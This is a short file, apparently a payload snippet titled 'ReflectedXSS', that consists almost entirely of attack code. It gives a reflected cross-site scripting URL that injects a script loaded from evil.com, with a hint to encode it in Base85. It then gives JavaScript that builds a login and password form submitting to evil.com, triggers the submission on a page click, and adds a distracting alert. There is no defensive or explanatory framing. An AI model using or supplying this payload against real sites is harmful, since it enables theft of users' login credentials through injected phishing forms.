# ReflectedXSS

https://www.example.com/vulnerable_page?vulnerable_param="><script src=https://evil.com/a.js> (use Base85 after equal)

var p = document.createElement("input");
    p.setAttribute("type", "password");
    p.setAttribute("name", "password");
var l = document.createElement("input");
    l.setAttribute("type", "text");
    l.setAttribute("name", "login");
var f = document.createElement("form");
    f.setAttribute("method", "post");
    f.setAttribute("action", "https://evil.com/");
    f.appendChild(l);
    f.appendChild(p);
    document.body.appendChild(f)
function clck() {setTimeout(()=>{f.submit()}, 1000)}
document.body.setAttribute('onclick', 'clck()');
    setTimeout(()=>{alert('Write smth here')},2000)
    
    
